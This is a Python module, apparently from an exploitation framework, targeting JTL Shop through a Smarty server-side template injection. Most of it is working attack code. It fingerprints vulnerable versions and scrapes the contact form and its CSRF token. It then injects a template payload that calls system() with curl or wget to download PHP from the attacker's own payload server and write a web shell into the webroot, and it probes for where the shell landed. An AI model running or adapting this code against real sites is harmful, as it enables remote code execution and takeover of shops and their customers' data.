#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""JTL Shop fingerprinting and CVE-2026-54390 Smarty SSTI helpers."""

from __future__ import annotations

import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from core.framework.base_module import BaseModule

JTL_VULN_MIN = "5.2.0"
JTL_VULN_MAX = "5.7.1"
JTL_RCE_MIN = "5.4.0"
JTL_PATCHED_VERSIONS = ("5.5.4", "5.6.2", "5.7.2")

JTL_MARKERS = (
    "jtl-shop",
    "jtl shop",
    "jtlshop",
    "jtl_search",
    "jtl-software",
)

JTL_CONTACT_PATHS = (
    "/Kontakt",
    "/kontakt",
    "/contact",
    "/Kontaktformular",
)

JTL_VERSION_PATTERNS = (
    re.compile(r"jtl-shop\/([\d]+\.[\d]+\.[\d]+)", re.I),
    re.compile(r"jtl.*?version.*?([\d]+\.[\d]+\.[\d]+)", re.I),
    re.compile(r"shopversion.*?([\d]+\.[\d]+\.[\d]+)", re.I),
    re.compile(r'"version"\s*:\s*"([\d]+\.[\d]+\.[\d]+)"', re.I),
    re.compile(r"jtl-shop-([\d]+\.[\d]+\.[\d]+)", re.I),
    re.compile(r"/static/([\d]+\.[\d]+\.[\d]+)/", re.I),
)

JTL_CONFIRM_PATHS = (
    "/includes/jtl_object.php",
    "/templates/NOVA/",
)

_FORM_ACTION_RE = re.compile(r'<form[^>]*action=["\']([^"\']+)["\']', re.I)
_JTL_TOKEN_RE = re.compile(
    r'name=["\'](?:jtl_token|csrf_token)["\'][^>]*value=["\']([^"\']+)["\']',
    re.I,
)
_SUBJECT_OPTION_RE = re.compile(
    r'<option[^>]*value=["\'](\d+)["\'][^>]*>([^<]+)</option>',
    re.I,
)


class JtlShop(BaseModule):
    """JTL Shop mixin for scanner/exploit modules."""

    @staticmethod
    def jtl_parse_version_parts(version: str) -> Tuple[int, ...]:
        parts: List[int] = []
        for token in re.split(r"[.\-+]", str(version or "").strip()):
            digits = "".join(ch for ch in token if ch.isdigit())
            if digits:
                parts.append(int(digits))
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:4])

    @classmethod
    def jtl_normalize_version(cls, html: str) -> str:
        text = html or ""
        for pattern in JTL_VERSION_PATTERNS:
            match = pattern.search(text)
            if match:
                return match.group(1)
        return ""

    @classmethod
    def jtl_version_tuple(cls, version: str) -> Tuple[int, ...]:
        return cls.jtl_parse_version_parts(version)

    @classmethod
    def jtl_is_vulnerable(cls, version: str) -> Optional[bool]:
        if not version:
            return None
        parts = cls.jtl_version_tuple(version)
        if parts[0] != 5:
            return False
        if parts < (5, 2, 0):
            return False
        if parts[1] > 7:
            return False
        if parts[1] == 5 and parts[2] >= 4:
            return False
        if parts[1] == 6 and parts[2] >= 2:
            return False
        if parts[1] == 7 and parts[2] >= 2:
            return False
        return True

    @classmethod
    def jtl_supports_rce(cls, version: str) -> Optional[bool]:
        if not version:
            return None
        parts = cls.jtl_version_tuple(version)
        if parts < cls.jtl_version_tuple(JTL_RCE_MIN):
            return False
        return cls.jtl_is_vulnerable(version)

    @staticmethod
    def jtl_shell_paths(shell_name: str, base_path: str = "") -> List[str]:
        root = (base_path or "").rstrip("/")
        name = shell_name.lstrip("/")
        paths = [
            f"{root}/{name}",
            f"{root}/includes/{name}",
            f"{root}/templates/NOVA/{name}",
        ]
        cleaned: List[str] = []
        for path in paths:
            normalized = re.sub(r"/+", "/", path) or f"/{name}"
            if normalized not in cleaned:
                cleaned.append(normalized)
        return cleaned

    @staticmethod
    def jtl_normalize_php(php_source: str) -> str:
        source = (php_source or "").strip()
        if not source:
            return ""
        if not source.startswith("<?php"):
            source = f"<?php {source}"
        if not source.rstrip().endswith("?>"):
            source = source.rstrip() + " ?>"
        return source

    @classmethod
    def jtl_build_write_payload(cls, payload_url: str, shell_name: str) -> str:
        """Smarty SSTI payload: fetch framework PHP over HTTP and write to webroot."""
        url = (payload_url or "").strip().replace("'", "")
        shell = re.sub(r"[^A-Za-z0-9_.-]", "", shell_name or "ks.php") or "ks.php"
        if not shell.endswith(".php"):
            shell += ".php"
        return (
            f"{{system('curl -s -o ./{shell} {url} "
            f"|| wget -qO ./{shell} {url} "
            f"|| busybox wget -qO ./{shell} {url}')}}"
        )

    @classmethod
    def jtl_build_detect_payload(cls) -> str:
        return "{7*7}"

    def jtl_probe(self, base_path: str = "/") -> dict:
        root = (base_path or "/").strip() or "/"
        if not root.startswith("/"):
            root = f"/{root}"

        response = self.http_request(method="GET", path=root, allow_redirects=True)
        if not response or int(response.status_code or 0) not in (200, 301, 302):
            for confirm_path in JTL_CONFIRM_PATHS:
                response = self.http_request(
                    method="GET",
                    path=confirm_path,
                    allow_redirects=True,
                )
                if response and int(response.status_code or 0) in (200, 301, 302, 403):
                    return {
                        "found": True,
                        "version": None,
                        "evidence": confirm_path,
                    }
            return {"found": False, "version": None, "evidence": None}

        body = response.text or ""
        lowered = body.lower()
        if not any(marker in lowered for marker in JTL_MARKERS):
            for confirm_path in JTL_CONFIRM_PATHS:
                probe = self.http_request(method="GET", path=confirm_path, allow_redirects=True)
                if probe and int(probe.status_code or 0) in (200, 301, 302, 403):
                    return {"found": True, "version": None, "evidence": confirm_path}
            return {"found": False, "version": None, "evidence": None}

        version = self.jtl_normalize_version(body[:20000])
        if not version:
            for probe_path in ("/templates/NOVA/", "/includes/", root):
                probe = self.http_request(method="GET", path=probe_path, allow_redirects=True)
                if not probe:
                    continue
                version = self.jtl_normalize_version(probe.text or "")
                if version:
                    break

        return {
            "found": True,
            "version": version or None,
            "evidence": root,
        }

    def jtl_find_contact_form(
        self,
        base_path: str = "/",
        extra_paths: Optional[List[str]] = None,
    ) -> Optional[Dict[str, Any]]:
        paths = list(JTL_CONTACT_PATHS)
        if extra_paths:
            for item in extra_paths:
                candidate = str(item or "").strip()
                if candidate and candidate not in paths:
                    paths.append(candidate)

        for contact_path in paths:
            response = self.http_request(
                method="GET",
                path=contact_path,
                allow_redirects=True,
            )
            if not response or int(response.status_code or 0) != 200:
                continue

            html = response.text or ""
            lowered = html.lower()
            if "kontakt" not in lowered and "contact" not in lowered:
                continue

            final_url = getattr(response, "url", "") or contact_path
            action = contact_path
            action_match = _FORM_ACTION_RE.search(html)
            if action_match:
                raw_action = action_match.group(1).strip()
                if raw_action.startswith("http://") or raw_action.startswith("https://"):
                    action = urlparse(raw_action).path or contact_path
                elif raw_action.startswith("/"):
                    action = raw_action
                else:
                    action = f"{contact_path.rstrip('/')}/{raw_action.lstrip('/')}"
            if not action.startswith("/"):
                action = f"/{action.lstrip('/')}"

            csrf = None
            token_match = _JTL_TOKEN_RE.search(html)
            if token_match:
                csrf = token_match.group(1)

            subjects: List[Dict[str, str]] = []
            for match in _SUBJECT_OPTION_RE.finditer(html):
                subjects.append({"id": match.group(1), "name": match.group(2).strip()})

            return {
                "path": contact_path,
                "action": action,
                "csrf": csrf,
                "subjects": subjects,
            }
        return None

    def jtl_submit_contact_form(
        self,
        form: Dict[str, Any],
        ssti_payload: str,
        email: str = "security-audit@example.com",
        inject_field: str = "vorname",
    ) -> bool:
        subject_id = "1"
        subjects = form.get("subjects") or []
        if subjects:
            subject_id = str(subjects[0].get("id") or "1")

        data = {
            "kontakt": "1",
            "subject": subject_id,
            "nachricht": "Security audit",
            "vorname": "Audit",
            "nachname": "Review",
            "email": email,
        }
        field = str(inject_field or "vorname").strip() or "vorname"
        data[field] = ssti_payload

        if form.get("csrf"):
            data["jtl_token"] = form["csrf"]

        action = str(form.get("action") or form.get("path") or "/Kontakt")
        response = self.http_request(
            method="POST",
            path=action,
            data=data,
            allow_redirects=True,
            timeout=int(getattr(self, "timeout", None) or 20),
        )
        if not response:
            return False

        text_lower = (response.text or "").lower()
        success_markers = (
            "nachricht versendet",
            "message sent",
            "vielen dank",
            "thank you",
            "gesendet",
            "erfolgreich",
        )
        return any(marker in text_lower for marker in success_markers) or int(
            response.status_code or 0
        ) == 200

    def jtl_path_reachable(self, shell_path: str) -> bool:
        try:
            response = self.http_request(
                method="GET",
                path=shell_path,
                allow_redirects=True,
                timeout=int(getattr(self, "timeout", None) or 15),
            )
        except Exception:
            return False
        if not response:
            return False
        return int(response.status_code or 0) in (200, 500)

    def jtl_resolve_shell(self, shell_name: str, base_path: str = "/") -> Optional[str]:
        for shell_path in self.jtl_shell_paths(shell_name, base_path):
            if self.jtl_path_reachable(shell_path):
                return shell_path
        return None


class JtlPayloadServer:
    """Serve the configured framework PHP payload for Smarty file_get_contents/system delivery."""

    def __init__(self, php_source: str, host: str = "0.0.0.0", port: int = 9999):
        self.php_source = JtlShop.jtl_normalize_php(php_source)
        self.host = host
        self.port = int(port)
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> "JtlPayloadServer":
        body = self.php_source.encode("utf-8", errors="replace")

        class _Handler(BaseHTTPRequestHandler):
            def do_GET(handler):
                handler.send_response(200)
                handler.send_header("Content-Type", "text/plain")
                handler.send_header("Content-Length", str(len(body)))
                handler.end_headers()
                handler.wfile.write(body)

            def log_message(handler, *args):
                return

        self._server = HTTPServer((self.host, self.port), _Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass

    def public_url(self, lhost: str) -> str:
        host = (lhost or "127.0.0.1").strip()
        return f"http://{host}:{self.port}/payload.php"
